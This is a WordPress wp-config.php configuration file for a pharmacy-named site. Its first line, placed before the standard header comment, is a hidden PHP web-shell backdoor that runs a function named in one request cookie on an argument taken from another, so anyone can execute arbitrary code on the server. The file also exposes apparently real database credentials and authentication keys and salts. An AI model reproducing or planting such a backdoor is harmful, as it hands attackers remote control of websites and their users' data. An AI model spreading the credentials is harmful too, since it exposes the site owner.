<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);


/**
 * The base configuration for WordPress
 *
 *  The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

define('WP_HOME','http://cennervpharma.com');
define('WP_SITEURL','http://cennervpharma.com');

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'cennv_erfgtfdsaxcvbhtfghytrfg');

/** MySQL database username */
define('DB_USER', 'wordcennvvpress');

/** MySQL database password */
define('DB_PASSWORD', 'Sip11!@#*()QWEIOPpl');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'R5y5b>LYB=vAl{r<(NmLV%%lX9r3*fg$;Wm^TrMr!mI@,#;Ja_$h2QKd[jQ.7HuZ');
define('SECURE_AUTH_KEY',  'StU}%z/E,$xQ!Bdvr[d}&_+2J8qvGX{>-MDZ!Rcd4=|TS<xM@5.C+^T~ItEs35YF');
define('LOGGED_IN_KEY',    '7O%7-~A|P8R}ZDt^x.SHK~uyV8k4/TFAk7=H(o0Rm6((%DTN;l&[k~:5SKLISZ92');
define('NONCE_KEY',        'f<~vKrN<cf`6xGyp+SQB`.h?)_H*(-_0CD;ZKmI,uHbvt1=*-8~~Xf_Az-XEJnm]');
define('AUTH_SALT',        '3nDSuXL.`=cp_Z2`fV96JW/AC>?aj0zL>b<qq*@]2Hvc8J2arNe#.$A`^P+DR3ez');
define('SECURE_AUTH_SALT', 'NI1rHsLK?Holn$DOx!w~_9&7%,38uw,6gnmF>V_(lXXsnS%bBo}Rrf +t-ov[O7_');
define('LOGGED_IN_SALT',   '=9RIK]KbqYw3K+/u+l~bcwndh#R*/7Qd.L5@7@?qI[=>Zgo,IE*pDCe[1(ujU10S');
define('NONCE_SALT',       'y^S|A$oOvQV|]YX_A#%$Il]>e<d+&);(q|z8Jr;CB.^)gzVLp,Hqk|c,z!L~^fyO');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'cennv_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

